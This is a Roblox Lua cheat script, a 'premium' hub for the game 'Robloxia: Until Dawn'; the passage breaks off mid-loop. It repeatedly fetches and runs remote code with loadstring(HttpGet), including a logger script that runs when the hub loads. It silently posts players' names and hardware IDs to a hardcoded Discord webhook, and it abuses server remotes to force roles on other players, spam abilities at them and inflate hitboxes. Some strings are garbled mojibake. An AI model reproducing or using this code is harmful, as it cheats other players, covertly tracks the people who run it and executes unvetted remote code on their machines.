local KeyGuardLibrary = loadstring(game:HttpGet("https://cdn.keyguardian.org/library/v1.0.0.lua"))()
local trueData = "004c3a16ce744d22999ab1ba0345790c"
local falseData = "3d566138bb944acb9f6b9b7251700962"

KeyGuardLibrary.Set({
	publicToken = "e095ee88985043a08b3034ff0aae7803",
	privateToken = "226be9e7376b4cd784ddc6bbea172c61",
	trueData = trueData,
	falseData = falseData,
})

local key = ""

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Premium - ",
    SubTitle = "Forest Fire",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 340),
    Acrylic = false,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
})

local Tabs = {
    KeySys = Window:AddTab({ Title = "Key System", Icon = "key" }),
}

local Entkey = Tabs.KeySys:AddInput("Input", {
    Title = "Enter Key",
    Description = "Enter Key Here",
    Default = "",
    Placeholder = "Enter key",
    Numeric = false,
    Finished = true,
    Callback = function(Value)
        key = Value
    end
})

Window:SelectTab(1)

function webhoos()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/dizzyhvh/LoggerWebhook-OpenSource/refs/heads/main/psd')))()
end

function scammmer()
	local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")

-- Properties

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0, 0, 0)
Frame.BorderColor3 = Color3.new(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.197193503, 0, 0.353510886, 0)
Frame.Size = UDim2.new(0, 754, 0, 228)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.00928381924, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 747, 0, 228)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "Really Scammer"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextStrokeColor3 = Color3.new(1, 0, 0.0156863)
TextLabel.TextStrokeTransparency = 0
TextLabel.TextWrapped = true

UICorner.Parent = Frame
	wait(3)
	game.Players.LocalPlayer:Kick("You Were Unwhitelisted For Being a Scammer")
end

function scammmerfrieind()
	local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")

-- Properties

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0, 0, 0)
Frame.BorderColor3 = Color3.new(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.197193503, 0, 0.353510886, 0)
Frame.Size = UDim2.new(0, 754, 0, 228)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(-0.0132625587, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 763, 0, 228)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "Your'e Friend Was a Scammer For that He got unwhitelisted"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextStrokeColor3 = Color3.new(1, 0, 0.0156863)
TextLabel.TextStrokeTransparency = 0
TextLabel.TextWrapped = true

UICorner.Parent = Frame
	wait(3)
	game.Players.LocalPlayer:Kick("Your Were Unwhitelisted")
end

function CheckAdmin()
	for _, player in pairs(game.Players:GetChildren()) do
	   if player.Name == "iispeakjava" then
		  Kick()
	   elseif player.Name == "nick0lazo" then
		  Kick()
		  elseif player.Name == "PygonAlternate" then
			 Kick()
			 elseif player.Name == "SwagSwagMoneyBling" then
				Kick()
			 elseif player.Name == "LittleMichaeI" then
				Kick()
			 elseif player.Name == "yayyer0" then
				KickV2()
			 elseif player.Name == "fivenight_atfreddysn" then

	   end
	end
 end


function RemoveHealtEffects()
	for _, HealthEffect in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
	   if HealthEffect.Name == "Heal" then
		HealthEffect:Destroy()
	   end
	end
end

function RemoveSpeedBoostEffect()
	for _, SpeedBoostEffect in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
		if SpeedBoostEffect.Name == "Overlay" then
		 SpeedBoostEffect:Destroy()
		end
	 end
end

function Skibidi()
		HttpService = game:GetService("HttpService")
WebHook_URL = "https://discord.com/api/webhooks/1301581905229254779/VGUlaRhvg-tZ-2cNz3Qbp6JavGnGqbx-j82Myo1J4EDK7Vehx147iyQiNW9HPMttGSQI"

local http_request = request(
{
	Url = WebHook_URL,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = HttpService:JSONEncode({
		["content"] = "",
		["embeds"] = {{
			["title"] = "**Some Body Tried To Share The Script Premium Version!**",
			["description"] = game.Players.LocalPlayer.Name.." has executed the script",
			["type"] = "rich",
			["color"] = tonumber(255000),
			["fields"] = {
				{
					["name"] = "Hardware ID",
					["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
					["inline"] = true,

				}
			}
		}}
	})
}
)
end
 
 function Kick()
	HttpService = game:GetService("HttpService")
WebHook_URL = "https://discord.com/api/webhooks/1301581905229254779/VGUlaRhvg-tZ-2cNz3Qbp6JavGnGqbx-j82Myo1J4EDK7Vehx147iyQiNW9HPMttGSQI"

local http_request = request(
{
	Url = WebHook_URL,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = HttpService:JSONEncode({
		["content"] = "",
		["embeds"] = {{
			["title"] = "**Someone got kicked LOL!**",
			["description"] = game.Players.LocalPlayer.Name.." has executed the script",
			["type"] = "rich",
			["color"] = tonumber(255000),
			["fields"] = {
				{
					["name"] = "Hardware ID",
					["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
					["inline"] = true,

				}
			}
		}}
	})
}
)
	game.Players.LocalPlayer:Kick("Uh Oh Admin Spooted That Has Joined Your'e Server !")
 end
 
 function KickV2()
	HttpService = game:GetService("HttpService")
WebHook_URL = "https://discord.com/api/webhooks/1301581905229254779/VGUlaRhvg-tZ-2cNz3Qbp6JavGnGqbx-j82Myo1J4EDK7Vehx147iyQiNW9HPMttGSQI"

local http_request = request(
{
	Url = WebHook_URL,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = HttpService:JSONEncode({
		["content"] = "",
		["embeds"] = {{
			["title"] = "**L Bozo**",
			["description"] = game.Players.LocalPlayer.Name.." has executed the script",
			["type"] = "rich",
			["color"] = tonumber(255000),
			["fields"] = {
				{
					["name"] = "Hardware ID",
					["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
					["inline"] = true,

				}
			}
		}}
	})
}
)
	game.Players.LocalPlayer:Kick("ÃƒÆ’Ã‚Â°Ãƒâ€¦Ã‚Â¸Ãƒâ€¹Ã…â€œÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ Bro Got Kicked By The Owner Of the Script ÃƒÆ’Ã‚Â°Ãƒâ€¦Ã‚Â¸Ãƒâ€¹Ã…â€œÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡")
 end

-- Button



-- Notify

-- Function

function MakeScriptHub()
	if game.PlaceId == 17382280326 or game.PlaceId == 80238404781977 then
		webhoos()
		local Players = game:GetService("Players")
		local Workspace = game:GetService("Workspace")
		local Killers54 = game.Workspace:WaitForChild("Killers"):GetChildren()
		
		-- Other Functions
		
		function Killer()
			for _, player in pairs(game.Workspace.Killers:GetChildren()) do
			   player.Name = "Abc"
			end
		 end
		 
local AdminCharacters = {}
local AdminKCharacters = {}

local NormalCharacters = {}
local NormalKCharacters = {}
local Locked = {}
local Nothing = {"Nothing.."}
local APr = {}
for _, leocked in pairs(game:GetService("ReplicatedStorage").Values.Chosencharacters:GetChildren()) do
    table.insert(Locked, leocked.Name)
end
for _, ap in pairs(game.ReplicatedStorage.Characters:GetDescendants()) do
    if ap:HasTag("Locked") then
        table.insert(APr, ap.Name)
    end
end

for _, leocked in pairs(game:GetService("ReplicatedStorage").Values.Chosencharacters:GetChildren()) do
    table.insert(Locked, leocked.Name)
end

for _, characters in pairs(game:GetService("ReplicatedStorage"):WaitForChild("Characters"):WaitForChild("Playable"):WaitForChild("Survivors"):GetChildren()) do
	table.insert(NormalCharacters, characters.Name)
end

for _, characters in pairs(game:GetService("ReplicatedStorage"):WaitForChild("Characters"):WaitForChild("Playable"):WaitForChild("Killers"):GetChildren()) do
	table.insert(NormalKCharacters, characters.Name)
end

for _, characters in pairs(game:GetService("ReplicatedStorage"):WaitForChild("Characters"):WaitForChild("Admin"):WaitForChild("Survivors"):GetChildren()) do
	table.insert(AdminCharacters, characters.Name)
end

for _, characters in pairs(game:GetService("ReplicatedStorage"):WaitForChild("Characters"):WaitForChild("Admin"):WaitForChild("Killers"):GetChildren()) do
	table.insert(AdminKCharacters, characters.Name)
end
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/dizzyhvh/customui/refs/heads/main/theme%20dark')))()
local Window = OrionLib:MakeWindow({Name = "Forest Fire Premium Mode - Robloxia: Until Dawn", HidePremium = true, IntoText = "Forest Fire", IntroEnabled = true, SaveConfig = true, ConfigFolder = "OrionTest"})


-- Tab

local Main = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Mainother = Window:MakeTab({
	Name = "Main Other",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Admin = Window:MakeTab({
	Name = "Admin Stuff",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local Adminother = Window:MakeTab({
	Name = "Admin Other", 
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Spame = Window:MakeTab({
	Name = "Spamming",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})


local Credits = Window:MakeTab({
	Name = "Credits", 
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Misc = Window:MakeTab({
	Name = "Misc", 
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})


local Lock = Window:MakeTab({
	Name = "Lock Stuff",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local AK = Lock:AddDropdown({
	Name = "Character",
	Default = "",
	Options = {"Nothing.."},
	Callback = function(Value)
		_G.charecter1 = Value
	end    
})

local lm = Lock:AddDropdown({
	Name = "Characters Locked 🔒",
	Default = "",
	Options = {"Nothing.."},
	Callback = function(Value)
		_G.charecter2 = Value
	end    
})

lm:Refresh(Locked,true)

local rt = Lock:AddDropdown({
	Name = "Characters You Locked 🔒",
	Default = "",
	Options = {"Nothing.."},
	Callback = function(Value)
		_G.charecter3 = Value
	end    
})

rt:Refresh(APr,true)

Lock:AddButton({
	Name = "Refresh Characters Locked 🔒",
	Callback = function()
        local Locked = {}
        local APr = {}
        for _, leocked in pairs(game:GetService("ReplicatedStorage").Values.Chosencharacters:GetChildren()) do
            table.insert(Locked, leocked.Name)
        end
        for _, ap in pairs(game.ReplicatedStorage.Characters:GetDescendants()) do
            if ap:HasTag("Locked") then
                table.insert(APr, ap.Name)
            end
        end
        rt:Refresh(APr,true)
        lm:Refresh(Locked,true)
  	end    
})

Lock:AddDropdown({
	Name = "Select Character Team",
	Default = "",
	Options = {"Killers", "Survivors", "Nothing"},
	Callback = function(Value)
		_G.ABC = Value
        local NormalCharacters = {}
        local NormalKCharacters = {}
        local Sawnoob = "SawNoob"
        local Nothing = {"Nothing.."}

        table.insert(NormalKCharacters, Sawnoob)
        for _, characters in pairs(game:GetService("ReplicatedStorage"):WaitForChild("Characters"):WaitForChild("Playable"):WaitForChild("Survivors"):GetChildren()) do
            table.insert(NormalCharacters, characters.Name)
        end

    
        for _, characters in pairs(game:GetService("ReplicatedStorage"):WaitForChild("Characters"):WaitForChild("Playable"):WaitForChild("Killers"):GetChildren()) do
            table.insert(NormalKCharacters, characters.Name)
        end
        if _G.ABC == "Killers" then
            AK:Refresh(NormalKCharacters,true)
        elseif _G.ABC == "Survivors" then
            AK:Refresh(NormalCharacters,true)
        else
            AK:Refresh(Nothing,true)
        end
	end    
})

_G.Donesd = nil

Lock:AddButton({
	Name = "Auto Break All Characters (Use EVERYTIME Before Game Starts!)",
	Callback = function()
        local Sel = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("SelectionGUI") or game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("SelectionGui")
        while true do
            task.wait()
            if Sel then
                for _, character in ipairs(NormalCharacters) do
                    if character == _G.charecter1 then
                        
                    else
                        local ohString1 = character
                if not game:GetService("Workspace"):FindFirstChild("Map") and game:GetService("Workspace").Map:FindFirstChild("Killerspawns") and game:GetService("Workspace").Map.Killerspawns:FindFirstChild("Spawn") then
                    local ohCFrame2 = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
                    local ohInstance3 = workspace.Survivors
                    game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
                    return
                end
                local ohCFrame2 = game:GetService("Workspace"):WaitForChild("Map"):WaitForChild("Killerspawns"):WaitForChild("Spawn").CFrame
                local ohInstance3 = workspace.Killers 
                
                game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
                    end
                end
                for _, character in ipairs(NormalKCharacters) do
                    if character == _G.charecter1 then
                        
                    else
                        local ohString1 = character
                if not game:GetService("Workspace"):FindFirstChild("Map") and game:GetService("Workspace").Map:FindFirstChild("Killerspawns") and game:GetService("Workspace").Map.Killerspawns:FindFirstChild("Spawn") then
                    local ohCFrame2 = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
                    local ohInstance3 = workspace.Survivors
                    game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
                    return
                end
                local ohCFrame2 = game:GetService("Workspace"):WaitForChild("Map"):WaitForChild("Killerspawns"):WaitForChild("Spawn").CFrame
                local ohInstance3 = workspace.Killers 
                
                game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
                    end
                end
            end
        end
  	end    
})

-- Label

Main:AddLabel("Player Stuff (Can't Be a Charecter as someone else use fly)")
Mainother:AddLabel("Reversed Roles ex baconhair as killer")
Admin:AddLabel("Don't Use these charecters unless you have a bypass")
Misc:AddLabel("Miscellaneous")

-- Section

Credits:AddSection({ Name = "This is Credits All people credited are in my discord" })
Credits:AddSection({ Name = "I Created everything" })
Adminother:AddSection({ Name = "Don't Use these charecters unless you have a bypass + ex Java as a Killer" })

-- Drop Down

local AK = Main:AddDropdown({
	Name = "Characters Killers",
	Default = "",
	Options = {},
	Callback = function(Value)
		_G.charecter1 = Value
local ohString1 = _G.charecter1
		if not game:GetService("Workspace"):FindFirstChild("Map") or not game:GetService("Workspace").Map:FindFirstChild("Killerspawns") or not game:GetService("Workspace").Map.Killerspawns:FindFirstChild("Spawn") then
    local ohCFrame2 = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
    local ohInstance3 = workspace.Killers
	
	game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
    return
end
local ohCFrame2 = game:GetService("Workspace"):WaitForChild("Map"):WaitForChild("Killerspawns"):WaitForChild("Spawn").CFrame
local ohInstance3 = workspace.Killers

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
	end    
})

AK:Refresh(NormalKCharacters,true)

local AK = Main:AddDropdown({
	Name = "Characters Survivors",
	Default = "",
	Options = {},
	Callback = function(Value)
		_G.charecter2 = Value
local ohString1 = _G.charecter2
		if not game:GetService("Workspace"):FindFirstChild("Map") or not game:GetService("Workspace").Map:FindFirstChild("Killerspawns") or not game:GetService("Workspace").Map.Killerspawns:FindFirstChild("Spawn") then
    local ohCFrame2 = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
    local ohInstance3 = workspace.Survivors
	
	game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
    return
end
local ohCFrame2 = game:GetService("Workspace"):WaitForChild("Map"):WaitForChild("Killerspawns"):WaitForChild("Spawn").CFrame
local ohInstance3 = workspace.Survivors 

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
	end    
})

AK:Refresh(NormalCharacters,true)

local AK = Mainother:AddDropdown({
	Name = "Characters Killers",
	Default = "",
	Options = {},
	Callback = function(Value)
		_G.charecter1 = Value
local ohString1 = _G.charecter1
		if not game:GetService("Workspace"):FindFirstChild("Map") or not game:GetService("Workspace").Map:FindFirstChild("Killerspawns") or not game:GetService("Workspace").Map.Killerspawns:FindFirstChild("Spawn") then
    local ohCFrame2 = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
    local ohInstance3 = workspace.Killers
	
	game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
    return
end
local ohCFrame2 = game:GetService("Players").LocalPlayer:WaitForChild("Killerspawns"):WaitForChild("Spawn").CFrame
local ohInstance3 = workspace.Killers

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
	end    
})

AK:Refresh(NormalKCharacters,true)

local AK = Mainother:AddDropdown({
	Name = "Characters Survivors",
	Default = "",
	Options = {},
	Callback = function(Value)
		_G.charecter2 = Value
local ohString1 = _G.charecter2
		if not game:GetService("Workspace"):FindFirstChild("Map") or not game:GetService("Workspace").Map:FindFirstChild("Killerspawns") or not game:GetService("Workspace").Map.Killerspawns:FindFirstChild("Spawn") then
    local ohCFrame2 = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
    local ohInstance3 = workspace.Survivors
	
	game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
    return
end
local ohCFrame2 = game:GetService("Workspace"):WaitForChild("Map"):WaitForChild("Killerspawns"):WaitForChild("Spawn").CFrame
local ohInstance3 = workspace.Survivors 

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
	end    
})

AK:Refresh(NormalCharacters,true)

-- Section

Main:AddLabel("No Cooldown (Not Working With Solara)")

-- Button

Misc:AddButton({
	Name = "Inf Yeild",
	Callback = function()
      		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
  	end    
})

Misc:AddButton({
	Name = "Fix Camera",
	Callback = function()
	OrionLib:MakeNotification({
	Name = "Infinite Yeild",
	Content = "Please Type FixCam In Infinte Yeild!",
	Image = "rbxassetid://4483345998",
	Time = 3
})
   end
})

Credits:AddButton({
	Name = "Join Our Discod!",
	Callback = function()
      		setclipboard("https://discord.gg/ETMUh7y46Y")
  	end    
})
Main:AddButton({ Name = "No Cooldown ", Callback = function() g = hookfunction(wait, function(seconds) return g(-9e999) end) end })

-- Admin Stuff Tab


-- drop down
local AK = Admin:AddDropdown({
	Name = "Characters Survivors",
	Default = "",
	Options = {},
	Callback = function(Value)
		_G.charecter2 = Value
local ohString1 = _G.charecter2
		if not game:GetService("Workspace"):FindFirstChild("Map") or not game:GetService("Workspace").Map:FindFirstChild("Killerspawns") or not game:GetService("Workspace").Map.Killerspawns:FindFirstChild("Spawn") then
    local ohCFrame2 = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
    local ohInstance3 = workspace.Survivors
	
	game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
    return
end
local ohCFrame2 = game:GetService("Workspace"):WaitForChild("Map"):WaitForChild("Killerspawns"):WaitForChild("Spawn").CFrame
local ohInstance3 = workspace.Survivors 

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
	end    
})

AK:Refresh(AdminCharacters,true)

local AK = Admin:AddDropdown({
	Name = "Characters Killers",
	Default = "",
	Options = {},
	Callback = function(Value)
		_G.charecter1 = Value
local ohString1 = _G.charecter1
		if not game:GetService("Workspace"):FindFirstChild("Map") or not game:GetService("Workspace").Map:FindFirstChild("Killerspawns") or not game:GetService("Workspace").Map.Killerspawns:FindFirstChild("Spawn") then
    local ohCFrame2 = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
    local ohInstance3 = workspace.Killers
	
	game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
    return
end
local ohCFrame2 = game:GetService("Workspace"):WaitForChild("Map"):WaitForChild("Killerspawns"):WaitForChild("Spawn").CFrame
local ohInstance3 = workspace.Killers

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
	end    
})

AK:Refresh(AdminKCharacters,true)

local AK = Adminother:AddDropdown({
	Name = "Characters Survivors",
	Default = "",
	Options = {},
	Callback = function(Value)
		_G.charecter2 = Value
local ohString1 = _G.charecter2
		if not game:GetService("Workspace"):FindFirstChild("Map") or not game:GetService("Workspace").Map:FindFirstChild("Killerspawns") or not game:GetService("Workspace").Map.Killerspawns:FindFirstChild("Spawn") then
    local ohCFrame2 = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
    local ohInstance3 = workspace.Killers
	
	game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
    return
end
local ohCFrame2 = game:GetService("Workspace"):WaitForChild("Map"):WaitForChild("Killerspawns"):WaitForChild("Spawn").CFrame
local ohInstance3 = workspace.Killers

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
	end    
})

AK:Refresh(AdminCharacters,true)

local AK = Adminother:AddDropdown({
	Name = "Characters Killers",
	Default = "",
	Options = {},
	Callback = function(Value)
		_G.charecter1 = Value
local ohString1 = _G.charecter1
		if not game:GetService("Workspace"):FindFirstChild("Map") or not game:GetService("Workspace").Map:FindFirstChild("Killerspawns") or not game:GetService("Workspace").Map.Killerspawns:FindFirstChild("Spawn") then
    local ohCFrame2 = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
    local ohInstance3 = workspace.Survivors
	
	game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
    return
end
local ohCFrame2 = game:GetService("Workspace"):WaitForChild("Map"):WaitForChild("Killerspawns"):WaitForChild("Spawn").CFrame
local ohInstance3 = workspace.Survivors

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(ohString1, ohCFrame2, ohInstance3)
	end    
})

AK:Refresh(AdminKCharacters,true)

-- Label

Main:AddLabel("Find Survivors")


-- Button


Main:AddButton({
	Name = "Print Survivors (fixed)",
	Callback = function()
		for _, player in pairs(game.Workspace.Survivors:GetChildren()) do
			print(player)
		end
  	end    
})

Main:AddButton({
	Name = "Print Deads",
	Callback = function()
		for _, player in pairs(game.Workspace.Dead:GetChildren()) do
			print(player)
		end
  	end    
})

Main:AddButton({
	Name = "Print Killers",
	Callback = function()
		for _, player in pairs(game.Workspace.Killers:GetChildren()) do
			print(player)
		end
  	end    
})


-- Label

Main:AddLabel("Hitbox changer")


Main:AddToggle({
	Name = "Hitbox Toggle",
	Default = false,
	Callback = function(Value)
		_G.Hitbox = Value
	end    
})


Main:AddSlider({
	Name = "Hitbox Size",
	Min = 10,
	Max = 100,
	Default = 15,
	Color = Color3.fromRGB(17, 0, 255),
	Increment = 1,
	ValueName = "Size",
	Callback = function(Value)
		_G.HitboxSize = Value
	end    
})

Main:AddDropdown({
	Name = "Select Target",
	Default = "Survivors",
	Options = {"Killers", "Survivors"},
	Callback = function(Value)
		_G.HitboxTarget = Value
	end    
})

local Players = game:GetService("Players")
local workspace = game:GetService("Workspace")
local Workspace = game:GetService("Workspace")
local lplr = Players.LocalPlayer
local Character
local HumanoidRootPart
local RunService = game:GetService("RunService")
local OpsiteHitboxTarget
_G.HitboxTarget = "Survivors"
_G.Hitbox = false
_G.HitboxSize = 15

function OpsiteHitboxTargetLocUpd()
    if _G.HitboxTarget == "Survivors" then
        OpsiteHitboxTarget = "Killers"
    else
        OpsiteHitboxTarget = "Survivors"
    end
end

function Updater()
    _G.HitboxTarget2 = OpsiteHitboxTarget
end

function ExpandHitBox()
    if _G.Hitbox then
        for _, Player in pairs(workspace:WaitForChild(_G.HitboxTarget):GetChildren()) do
            if Player == lplr.Character then
                
            else
                if Player and Player:FindFirstChild("HumanoidRootPart") then
                    Character = Player
                    HumanoidRootPart  = Character.HumanoidRootPart
                    
                    HumanoidRootPart.Size = Vector3.new(_G.HitboxSize, _G.HitboxSize, _G.HitboxSize)
                    HumanoidRootPart.Transparency = 0.5
                end
            end
        end
        for _, Player in pairs(workspace:WaitForChild(_G.HitboxTarget2):GetChildren()) do
            if Player and Player:FindFirstChild("HumanoidRootPart") then
                Character = Player
                HumanoidRootPart  = Character.HumanoidRootPart
                
                HumanoidRootPart.Size = Vector3.new(2, 2, 1)
                HumanoidRootPart.Transparency = 1
            end
        end
    else
        for _, Player in pairs(workspace:WaitForChild(_G.HitboxTarget2):GetChildren()) do
            if Player and Player:FindFirstChild("HumanoidRootPart") then
                Character = Player
                HumanoidRootPart  = Character.HumanoidRootPart
                
                HumanoidRootPart.Size = Vector3.new(2, 2, 1)
                HumanoidRootPart.Transparency = 1
            end
        end
        for _, Player in pairs(workspace:WaitForChild(_G.HitboxTarget):GetChildren()) do
            if Player and Player:FindFirstChild("HumanoidRootPart") then
                Character = Player
                HumanoidRootPart  = Character.HumanoidRootPart
                
                HumanoidRootPart.Size = Vector3.new(2, 2, 1)
                HumanoidRootPart.Transparency = 1
            end
        end
    end 
end

OpsiteHitboxTargetLocUpd()
Updater()
ExpandHitBox()

RunService.Heartbeat:Connect(function(deltaTime)
    OpsiteHitboxTargetLocUpd()
    ExpandHitBox()
    Updater()
end)


-- Label

Main:AddLabel("Force Killer")

local PlayersIngame = {}
local lplr = Players.LocalPlayer
for _, player in pairs(Players:GetChildren()) do
	if player == lplr then
		
	else
		table.insert(PlayersIngame, player.Name)
	end
end

-- Button

local APD = Main:AddDropdown({
	Name = "Choose Player",
	Default = "",
	Options = {"Nobody???"},
	Callback = function(Value)
		_G.ForceKiller = Value
	end 
})

APD:Refresh(PlayersIngame,true)

Main:AddButton({
	Name = "Refresh",
	Callback = function()
		local PlayersIngame = {}
		local lplr = Players.LocalPlayer
		for _, player in pairs(Players:GetChildren()) do
			if player == lplr then	

			else
				table.insert(PlayersIngame, player.Name)
			end
		end
		APD:Refresh(PlayersIngame,true)
	end    
})

Main:AddButton({
	Name = "Make Yourself Killer",
	Callback = function()
		local ohInstance1 = game:GetService("Players").LocalPlayer

		game:GetService("ReplicatedStorage").Remotes.Forcekiller:FireServer(ohInstance1)
		end
})

Main:AddButton({
	Name = "Make Another Person Killer",
	Callback = function()
		local ohInstance1 = game:GetService("Players"):WaitForChild(_G.ForceKiller)

		game:GetService("ReplicatedStorage").Remotes.Forcekiller:FireServer(ohInstance1)
		end
})

-- Label

Spame:AddLabel("Trolling Stuff Must Have The Correct Charecter")

-- DropDown


Spame:AddDropdown({
	Name = "Choose Target",
	Default = "",
	Options = {"Yourself", "Other Person"},
	Callback = function(Value)
		_G.target = Value
	end 
})

Spame:AddDropdown({
	Name = "Choose Target Ability",
	Default = "",
	Options = {"Quick Slash", "Ban Hammer", "Windforce", "Rocket Launcher"},
	Callback = function(Value)
		_G.aber = Value
		if _G.aber == "Quick Slash" then
			_G.aber = "Quick slash"
		elseif _G.aber == "Ban Hammer" then
			_G.aber = "Ban"
		elseif _G.aber == "Rocket Launcher" then
			_G.aber = "Launcher"
		end
	end 
})

Spame:AddToggle({
	Name = "Ability Use",
	Default = false,
	Callback = function(Value)
		_G.Fuck = Value
		if _G.target == "Other Person" then
			while _G.Fuck == true do
				for _, player in pairs(game:GetService("Players"):GetChildren()) do
					if player and player.Character and player.Character:FindFirstChild(_G.aber) then
				if _G.aber == "Launcher" then
					for i, v in pairs(game:GetService("Workspace").Killers:GetChildren()) do
						local ohVector31 = v:FindFirstChild("HumanoidRootPart").Position
						player.Character.Launcher.Remotes.Shoot:FireServer(ohVector31)
					end
					for i, v in pairs(game:GetService("Workspace").Dead:GetChildren()) do
						if v then
						local ohVector31 = v:FindFirstChild("HumanoidRootPart").Position
						player.Character.Launcher.Remotes.Shoot:FireServer(ohVector31)
					end
				end
				else
					for i, v in pairs(game.Workspace.Killers:GetChildren()) do
						local ohInstance1 = v
						player.Character[_G.aber].Remotes.Hit:FireServer(ohInstance1)
					end
					for i, v in pairs(game.Workspace.Dead:GetChildren()) do
						if v then
						local ohInstance1 = v
					
					player.Character[_G.aber].Remotes.Hit:FireServer(ohInstance1)
				end
			end
		end
	end
	end
	task.wait()
end
else
	local lplr = game:GetService("Players").LocalPlayer
	local Chr = lplr.Character
	while _G.Fuck == true do
		if Chr:FindFirstChild("Launcher") then
			for i, v in pairs(game:GetService("Workspace").Killers:GetChildren()) do
